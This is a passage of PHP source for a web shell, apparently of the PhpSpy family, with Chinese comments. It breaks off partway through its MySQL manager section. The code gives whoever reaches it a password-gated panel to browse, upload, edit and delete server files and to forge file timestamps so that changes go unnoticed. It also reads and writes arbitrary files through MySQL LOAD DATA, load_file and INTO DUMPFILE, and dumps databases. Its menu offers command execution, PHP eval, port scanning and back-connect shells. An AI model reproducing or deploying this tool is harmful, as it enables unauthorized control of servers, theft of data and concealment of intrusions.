       /*===================== 配置结束 =====================*/
       
       $charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp1256','cp1257','cp850','cp852','cp866','cp932','dec8','euc-jp','euc-kr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');
       if ($charset == 'utf8') {
           header("content-Type: text/html; charset=utf-8");
       } elseif ($charset == 'big5') {
           header("content-Type: text/html; charset=big5");
       } elseif ($charset == 'gbk') {
           header("content-Type: text/html; charset=gbk");
       } elseif ($charset == 'latin1') {
           header("content-Type: text/html; charset=iso-8859-2");
       } elseif ($charset == 'euc-kr') {
           header("content-Type: text/html; charset=euc-kr");
       } elseif ($charset == 'euc-jp') {
           header("content-Type: text/html; charset=euc-jp");
       }
       
       $self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
       $timestamp = time();
       
       /*===================== 身份验证 =====================*/
       if ($action == "logout") {
           scookie('loginpass', '', -86400 * 365);
           @header('Location: '.$self);
           exit;
       }
       if($pass) {
           if ($action == 'login') {
               if ($pass == encode_pass($password)) {
                   scookie('loginpass',encode_pass($password));
                   @header('Location: '.$self);
                   exit;
               }
           }
           if ($_COOKIE['loginpass']) {
               if ($_COOKIE['loginpass'] != $pass) {
                   loginpage();
               }
           } else {
               loginpage();
           }
       }
       /*===================== 验证结束 =====================*/
       
       $errmsg = '';
       !$action && $action = 'file';
       
       // 查看PHPINFO
       if ($action == 'phpinfo') {
           if (IS_PHPINFO) {
               phpinfo();
               exit;
           } else {
               $errmsg = 'phpinfo() function has non-permissible';
           }
       }
       
       // 下载文件
       if ($doing == 'downfile' && $thefile) {
           if (!@file_exists($thefile)) {
               $errmsg = 'The file you want Downloadable was nonexistent';
           } else {
               $fileinfo = pathinfo($thefile);
               header('Content-type: application/x-'.$fileinfo['extension']);
               header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
               header('Content-Length: '.filesize($thefile));
               @readfile($thefile);
               exit;
           }
       }
       
       // 直接下载备份数据库
       if ($doing == 'backupmysql' && !$saveasfile) {
           if (!$table) {
               $errmsg ='Please choose the table';
           } else {
               $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
               $filename = basename($dbname.'.sql');
               header('Content-type: application/unknown');
               header('Content-Disposition: attachment; filename='.$filename);
               foreach($table as $k => $v) {
                   if ($v) {
                       sqldumptable($v);
                   }
               }
               mysql_close();
               exit;
           }
       }
       
       // 通过MYSQL下载文件
       if($doing=='mysqldown'){
           if (!$dbname) {
               $errmsg = 'Please input dbname';
           } else {
               $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
               if (!file_exists($mysqldlfile)) {
                   $errmsg = 'The file you want Downloadable was nonexistent';
               } else {
                   $result = q("select load_file('$mysqldlfile');");
                   if(!$result){
                       q("DROP TABLE IF EXISTS tmp_angel;");
                       q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
                       //用时间戳来表示截断,避免出现读取自身或包含__angel_1111111111_eof__的文件时不完整的情况
                       q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
                       $result = q("select content from tmp_angel");
                       q("DROP TABLE tmp_angel");
                   }
                   $row = @mysql_fetch_array($result);
                   if (!$row) {
                       $errmsg = 'Load file failed '.mysql_error();
                   } else {
                       $fileinfo = pathinfo($mysqldlfile);
                       header('Content-type: application/x-'.$fileinfo['extension']);
                       header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
                       header("Accept-Length: ".strlen($row[0]));
                       echo $row[0];
                       exit;
                   }
               }
           }
       }
       
       ?>
       <html>
       <head>
       <meta http-equiv="Content-Type" content="text/html; charset=gbk">
       <title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>
       <style type="text/css">
       body,td{font: 12px Arial,Tahoma;line-height: 16px;}
       .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
       .area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
       .bt {border-color:#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#ffffff;font:12px Arial,Tahoma;height:22px;}
       a {color: #00f;text-decoration:underline;}
       a:hover{color: #f00;text-decoration:none;}
       .alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
       .alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
       .focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
       .head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
       .head td span{font-weight:normal;}
       .infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
       form{margin:0;padding:0;}
       h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
       ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
       u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
       .drives{padding:5px;}
       .drives span {margin:auto 7px;}
       </style>
       <script type="text/javascript">
       function CheckAll(form) {
           for(var i=0;i<form.elements.length;i++) {
               var e = form.elements[i];
               if (e.name != 'chkall')
               e.checked = form.chkall.checked;
           }
       }
       function $(id) {
           return document.getElementById(id);
       }
       function createdir(){
           var newdirname;
           newdirname = prompt('Please input the directory name:', ''  );
           if (!newdirname) return;
           $('createdir').newdirname.value=newdirname;
           $('createdir').submit();
       }
       function fileperm(pfile){
           var newperm;
           newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
           if (!newperm) return;
           $('fileperm').newperm.value=newperm;
           $('fileperm').pfile.value=pfile;
           $('fileperm').submit();
       }
       function copyfile(sname){
           var tofile;
           tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
           if (!tofile) return;
           $('copyfile').tofile.value=tofile;
           $('copyfile').sname.value=sname;
           $('copyfile').submit();
       }
       function rename(oldname){
           var newfilename;
           newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
           if (!newfilename) return;
           $('rename').newfilename.value=newfilename;
           $('rename').oldname.value=oldname;
           $('rename').submit();
       }
       function dofile(doing,thefile,m){
           if (m && !confirm(m)) {
               return;
           }
           $('filelist').doing.value=doing;
           if (thefile){
               $('filelist').thefile.value=thefile;
           }
           $('filelist').submit();
       }
       function createfile(nowpath){
           var filename;
           filename = prompt('Please input the file name:', '');
           if (!filename) return;
           opfile('editfile',nowpath + filename,nowpath);
       }
       function opfile(action,opfile,dir){
           $('fileopform').action.value=action;
           $('fileopform').opfile.value=opfile;
           $('fileopform').dir.value=dir;
           $('fileopform').submit();
       }
       function godir(dir,view_writable){
           if (view_writable) {
               $('godir').view_writable.value=view_writable;
           }
           $('godir').dir.value=dir;
           $('godir').submit();
       }
       function getsize(getdir,dir){
           $('getsize').getdir.value=getdir;
           $('getsize').dir.value=dir;
           $('getsize').submit();
       }
       function editrecord(action, base64, tablename){
           if (action == 'del') {      
               if (!confirm('Is or isn\'t deletion record?')) return;
           }
           $('recordlist').doing.value=action;
           $('recordlist').base64.value=base64;
           $('recordlist').tablename.value=tablename;
           $('recordlist').submit();
       }
       function moddbname(dbname) {
           if(!dbname) return;
           $('setdbname').dbname.value=dbname;
           $('setdbname').submit();
       }
       function settable(tablename,doing,page) {
           if(!tablename) return;
           if (doing) {
               $('settable').doing.value=doing;
           }
           if (page) {
               $('settable').page.value=page;
           }
           $('settable').tablename.value=tablename;
           $('settable').submit();
       }
       function s(action,nowpath,p1,p2,p3,p4,p5) {
           if(action) $('opform').action.value=action;
           if(nowpath) $('opform').nowpath.value=nowpath;
           if(p1) $('opform').p1.value=p1;
           if(p2) $('opform').p2.value=p2;
           if(p3) $('opform').p3.value=p3;
           if(p4) $('opform').p4.value=p4;
           if(p5) $('opform').p4.value=p5;
       }
       function g(action,nowpath,p1,p2,p3,p4,p5) {
           if(!action) return;
           s(action,nowpath,p1,p2,p3,p4,p5);
           $('opform').submit();
       }
       </script>
       </head>
       <body style="margin:0;table-layout:fixed; word-break:break-all">
       <?php
       formhead(array('name'=>'opform'));
       makehide('action', $action);
       makehide('nowpath', $nowpath);
       makehide('p1', $p1);
       makehide('p2', $p2);
       makehide('p3', $p3);
       makehide('p4', $p4);
       makehide('p5', $p5);
       formfoot();
       
       if(!function_exists('posix_getegid')) {
           $user = @get_current_user();
           $uid = @getmyuid();
           $gid = @getmygid();
           $group = "?";
       } else {
           $uid = @posix_getpwuid(@posix_geteuid());
           $gid = @posix_getgrgid(@posix_getegid());
           $user = $uid['name'];
           $uid = $uid['uid'];
           $group = $gid['name'];
           $gid = $gid['gid'];
       }
       
       ?>
       <table width="100%" border="0" cellpadding="0" cellspacing="0">
           <tr class="head">
               <td><span style="float:right;"><?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
           </tr>
           <tr class="alt1">
               <td>
                   <span style="float:right;">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>
                   <a href="javascript:g('logout');">Logout</a> | 
                   <a href="javascript:g('file');">File Manager</a> | 
                   <a href="javascript:g('mysqladmin');">MYSQL Manager</a> | 
                   <a href="javascript:g('sqlfile');">MySQL Upload &amp; Download</a> | 
                   <a href="javascript:g('shell');">Execute Command</a> | 
                   <a href="javascript:g('phpenv');">PHP Variable</a> | 
                   <a href="javascript:g('portscan');">Port Scan</a> | 
                   <a href="javascript:g('secinfo');">Security information</a> | 
                   <a href="javascript:g('eval');">Eval PHP Code</a>
                   <?php if (!IS_WIN) {?> | <a href="javascript:g('backconnect');">Back Connect</a><?php }?>
               </td>
           </tr>
       </table>
       <table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
       <?php
       $errmsg && m($errmsg);
       
       // 获取当前路径
       if (!$dir) {
           $dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
       }
       $nowpath = getPath(SA_ROOT, $dir);
       if (substr($dir, -1) != '/') {
           $dir = $dir.'/';
       }
       
       if ($action == 'file') {
       
           // 判断读写情况
           $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
       
           // 创建目录
           if ($newdirname) {
               $mkdirs = $nowpath.$newdirname;
               if (file_exists($mkdirs)) {
                   m('Directory has already existed');
               } else {
                   m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
                   @chmod($mkdirs,0777);
               }
           }
       
           // 上传文件
           elseif ($doupfile) {
               m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
           }
       
           // 编辑文件
           elseif ($editfilename && $filecontent) {
               $fp = @fopen($editfilename,'w');
               m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
               @fclose($fp);
           }
       
           // 编辑文件属性
           elseif ($pfile && $newperm) {
               if (!file_exists($pfile)) {
                   m('The original file does not exist');
               } else {
                   $newperm = base_convert($newperm,8,10);
                   m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
               }
           }
       
           // 改名
           elseif ($oldname && $newfilename) {
               $nname = $nowpath.$newfilename;
               if (file_exists($nname) || !file_exists($oldname)) {
                   m($nname.' has already existed or original file does not exist');
               } else {
                   m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
               }
           }
       
           // 复制文件
           elseif ($sname && $tofile) {
               if (file_exists($tofile) || !file_exists($sname)) {
                   m('The goal file has already existed or original file does not exist');
               } else {
                   m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
               }
           }
       
           // 克隆时间
           elseif ($curfile && $tarfile) {
               if (!@file_exists($curfile) || !@file_exists($tarfile)) {
                   m('The goal file has already existed or original file does not exist');
               } else {
                   $time = @filemtime($tarfile);
                   m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
               }
           }
       
           // 自定义时间
           elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
               if (!@file_exists($curfile)) {
                   m(basename($curfile).' does not exist');
               } else {
                   $time = strtotime("$year-$month-$day $hour:$minute:$second");
                   m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
               }
           }
       
           // 批量删除文件
           elseif($doing == 'delfiles') {
               if ($dl) {
                   $dfiles='';
                   $succ = $fail = 0;
                   foreach ($dl as $filepath) {
                       if (is_dir($filepath)) {
                           if (@deltree($filepath)) {
                               $succ++;
                           } else {
                               $fail++;
                           }
                       } else {
                           if (@unlink($filepath)) {
                               $succ++;
                           } else {
                               $fail++;
                           }
                       }
                   }
                   m('Deleted folder/file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);
               } else {
                   m('Please select folder/file(s)');
               }
           }
       
           //操作完毕
           formhead(array('name'=>'createdir'));
           makehide('newdirname');
           makehide('dir',$nowpath);
           formfoot();
           formhead(array('name'=>'fileperm'));
           makehide('newperm');
           makehide('pfile');
           makehide('dir',$nowpath);
           formfoot();
           formhead(array('name'=>'copyfile'));
           makehide('sname');
           makehide('tofile');
           makehide('dir',$nowpath);
           formfoot();
           formhead(array('name'=>'rename'));
           makehide('oldname');
           makehide('newfilename');
           makehide('dir',$nowpath);
           formfoot();
           formhead(array('name'=>'fileopform', 'target'=>'_blank'));
           makehide('action');
           makehide('opfile');
           makehide('dir');
           formfoot();
           formhead(array('name'=>'getsize'));
           makehide('getdir');
           makehide('dir');
           formfoot();
       
           $free = @disk_free_space($nowpath);
           !$free && $free = 0;
           $all = @disk_total_space($nowpath);
           !$all && $all = 0;
           $used = $all-$free;
           p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');
       
           $cwd_links = '';
           $path = explode('/', $nowpath);
           $n=count($path);
           for($i=0;$i<$n-1;$i++) {
               $cwd_links .= '<a href="javascript:godir(\'';
               for($j=0;$j<=$i;$j++) {
                   $cwd_links .= $path[$j].'/';
               }
               $cwd_links .= '\');">'.$path[$i].'/</a>';
           }
       
       ?>
       <script type="text/javascript">
       document.onclick = shownav;
       function shownav(e){
           var src = e?e.target:event.srcElement;
           do{
               if(src.id =="jumpto") {
                   $('inputnav').style.display = "";
                   $('pathnav').style.display = "none";
                   //hidenav();
                   return;
               }
               if(src.id =="inputnav") {
                   return;
               }
               src = src.parentNode;
           }while(src.parentNode)
       
           $('inputnav').style.display = "none";
           $('pathnav').style.display = "";
       }
       </script>
       <div style="background:#eee;margin-bottom:10px;">
           <table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
               <tr>
                   <td width="100%"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir_writeable;?>)</td>
                   <td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
               </tr>
           </table>
           <table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
           <form action="" method="post" id="godir" name="godir">
               <tr>
                   <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
                   <td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:99%;margin:0 8px;"></td>
                   <td nowrap><input class="bt" value="GO" type="submit"></td>
               </tr>
           </form>
           </table>
       <?php
           if (IS_WIN && IS_COM) {
               $obj = new COM('scripting.filesystemobject');
               if ($obj && is_object($obj) && $obj->Drives) {
                   echo '<div class="drives">';
                   $DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
                   $comma = '';
                   foreach($obj->Drives as $drive) {
                       if ($drive->Path) {
                           p($comma.'<a href="javascript:godir(\''.$drive->Path.'/\');">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
                           $comma = '<span>|</span>';
                       }
                   }
                   echo '</div>';
               }
           }
       ?>
       </div>
       <?php
           $findstr = $_POST['findstr'];
           $re = $_POST['re'];
           tbhead();
           p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
           p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$nowpath.'" type="hidden" /><input name="dir" value="'.$nowpath.'" type="hidden" /></div></form>');
           p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">WebRoot</a>');
           p(' | <a href="javascript:godir(\'.\');">ScriptPath</a>');
           p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
           p(' | View Writable ( <a href="javascript:godir(\''.$nowpath.'\',\'dir\');">Directory</a>');
           p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\');">File</a> )');
           p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');
       
           p('<div style="padding:5px 0;"><form action="'.$self.'" method="POST">Find string in files(current folder): <input class="input" name="findstr" value="'.$findstr.'" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="'.$writabledb.'" type="text" /><input name="dir" value="'.$dir.'" type="hidden" /> <input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /> Regular expressions</form></div></td></tr>');
       
           p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
       
           //查看所有可写文件和目录
           $dirdata=array();
           $filedata=array();
       
           if ($view_writable == 'dir') {
               $dirdata = GetWDirList($nowpath);
               $filedata = array();
           } elseif ($view_writable == 'file') {
               $dirdata = array();
               $filedata = GetWFileList($nowpath);
           } elseif ($findstr) {
               $dirdata = array();
               $filedata = GetSFileList($nowpath, $findstr, $re);
           } else {
               // 目录列表
               //scandir()效率更高
               $dirs=@opendir($dir);
               while ($file=@readdir($dirs)) {
                   $filepath=$nowpath.$file;
                   if(@is_dir($filepath)){
                       $dirdb['filename']=$file;
                       $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                       $dirdb['dirchmod']=getChmod($filepath);
                       $dirdb['dirperm']=getPerms($filepath);
                       $dirdb['fileowner']=getUser($filepath);
                       $dirdb['dirlink']=$nowpath;
                       $dirdb['server_link']=$filepath;
                       $dirdata[]=$dirdb;
                   } else {        
                       $filedb['filename']=$file;
                       $filedb['size']=sizecount(@filesize($filepath));
                       $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                       $filedb['filechmod']=getChmod($filepath);
                       $filedb['fileperm']=getPerms($filepath);
                       $filedb['fileowner']=getUser($filepath);
                       $filedb['dirlink']=$nowpath;
                       $filedb['server_link']=$filepath;
                       $filedata[]=$filedb;
                   }
               }// while
               unset($dirdb);
               unset($filedb);
               @closedir($dirs);
           }
           @sort($dirdata);
           @sort($filedata);
           $dir_i = '0';
       
           p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
           makehide('action','file');
           makehide('thefile');
           makehide('doing');
           makehide('dir',$nowpath);
       
           foreach($dirdata as $key => $dirdb){
               if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
                   if($getdir && $getdir == $dirdb['server_link']) {
                       $attachsize = dirsize($dirdb['server_link']);
                       $attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
                   } else {
                       $attachsize = '<a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');">Stat</a>';
                   }
                   $thisbg = bg();
                   p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                   p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$dirdb['server_link'].'"></td>');
                   p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
                   p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$dirdb['server_link'].'\',\''.$dirdb['dirlink'].'\');">'.$dirdb['mtime'].'</a></td>');
                   p('<td nowrap>'.$attachsize.'</td>');
                   p('<td nowrap>');
                   p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
                   p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
                   p('<td nowrap><a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
                   p('</tr>');
                   $dir_i++;
               } else {
                   if($dirdb['filename']=='..') {
                       p('<tr class='.bg().'>');
                       p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
                       p('</tr>');
                   }
               }
           }
       
           p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
           $file_i = '0';
       
           foreach($filedata as $key => $filedb){
               if($filedb['filename']!='..' && $filedb['filename']!='.') {
                   $fileurl = str_replace($_SERVER["DOCUMENT_ROOT"],'',$filedb['server_link']);
                   $thisbg = bg();
                   p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                   p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$filedb['server_link'].'"></td>');
                   p('<td>'.((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a>' : $filedb['filename']).'</td>');
                   p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">'.$filedb['mtime'].'</a></td>');
                   p('<td nowrap>'.$filedb['size'].'</td>');
                   p('<td nowrap>');
                   p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
                   p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
                   p('<td nowrap>');
                   p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
                   p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
                   p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
                   p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Rename</a>');
                   p('</td></tr>');
                   $file_i++;
               }
           }
           p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
           p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
           p('</form></table>');
       }// end dir
       
       elseif ($action == 'sqlfile') {
           if($doing=="mysqlupload"){
               $file = $_FILES['uploadfile'];
               $filename = $file['tmp_name'];
               if (file_exists($savepath)) {
                   m('The goal file has already existed');
               } else {
                   if(!$filename) {
                       m('Please choose a file');
                   } else {
                       $fp=@fopen($filename,'r');
                       $contents=@fread($fp, filesize($filename));
                       @fclose($fp);
                       $contents = bin2hex($contents);
                       if(!$upname) $upname = $file['name'];
                       $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                       $result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
                       m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
                   }
               }
           }
       ?>
       <script type="text/javascript">
       function mysqlfile(doing){
           if(!doing) return;
           $('doing').value=doing;
           $('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
           $('mysqlfile').dbport.value=$('dbinfo').dbport.value;
           $('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
           $('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
           $('mysqlfile').dbname.value=$('dbinfo').dbname.value;
           $('mysqlfile').charset.value=$('dbinfo').charset.value;
           $('mysqlfile').submit();
       }
       </script>
       <?php
           !$dbhost && $dbhost = 'localhost';
           !$dbuser && $dbuser = 'root';
           !$dbport && $dbport = '3306';
           formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
           makehide('action','sqlfile');
           p('<p>');
           p('DBHost:');
           makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
           p(':');
           makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
           p('DBUser:');
           makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
           p('DBPass:');
           makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
           p('DBName:');
           makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
           p('DBCharset:');
           makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
           p('</p>');
           formfoot();
           p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
           p('<h2>Upload file</h2>');
           p('<p><b>This operation the DB user must has FILE privilege</b></p>');
           p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
           p('<h2>Download file</h2>');
           p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
           makehide('dbhost');
           makehide('dbport');
           makehide('dbuser');
           makehide('dbpass');
           makehide('dbname');
           makehide('charset');
           makehide('doing');
           makehide('action','sqlfile');
           p('</form>');
       }
       
       elseif ($action == 'mysqladmin') {
           !$dbhost && $dbhost = 'localhost';
           !$dbuser && $dbuser = 'root';
           !$dbport && $dbport = '3306';
           $dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
           if(isset($dbhost)){
               $dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
           }
           if(isset($dbuser)) {
               $dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
           }
           if(isset($dbpass)) {
               $dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
           }
           if(isset($dbport)) {
               $dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
           }
           if(isset($dbname)) {
               $dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
           }
           if(isset($charset)) {
               $dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
           }
       
           if ($doing == 'backupmysql' && $saveasfile) {
               if (!$table) {
                   m('Please choose the table');
               } else {
                   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                   $fp = @fopen($path,'w');
                   if ($fp) {
                       foreach($table as $k => $v) {
                           if ($v) {
                               sqldumptable($v, $fp);
                           }
                       }
                       fclose($fp);                
                       $fileurl = str_replace(SA_ROOT,'',$path);
                       m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
                       mysql_close();
                   } else {
                       m('Backup failed');
                   }
               }
           }
           if ($insert && $insertsql) {
               $keystr = $valstr = $tmp = '';
               foreach($insertsql as $key => $val) {
                   if ($val) {
                       $keystr .= $tmp.$key;
                       $valstr .= $tmp."'".addslashes($val)."'";
                       $tmp = ',';
                   }
               }
               if ($keystr && $valstr) {
                   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                   m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
               }
           }
           if ($update && $insertsql && $base64) {
               $valstr = $tmp = '';
               foreach($insertsql as $key => $val) {
                   $valstr .= $tmp.$key."='".addslashes($val)."'";
                   $tmp = ',';
               }
               if ($valstr) {
                   $where = base64_decode($base64);
                   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                   m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
               }
           }
           if ($doing == 'del' && $base64) {
               $where = base64_decode($base64);
               $delete_sql = "DELETE FROM $tablename WHERE $where";
               $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
               m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
           }
       
           if ($tablename && $doing == 'drop') {
               $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
               if (q("DROP TABLE $tablename")) {
                   m('Drop table of success');
                   $tablename = '';
               } else {
                   m(mysql_error());
               }
           }
       
           formhead(array('title'=>'MYSQL Manager'));
           makehide('action','mysqladmin');
           p('<p>');
           p('DBHost:');
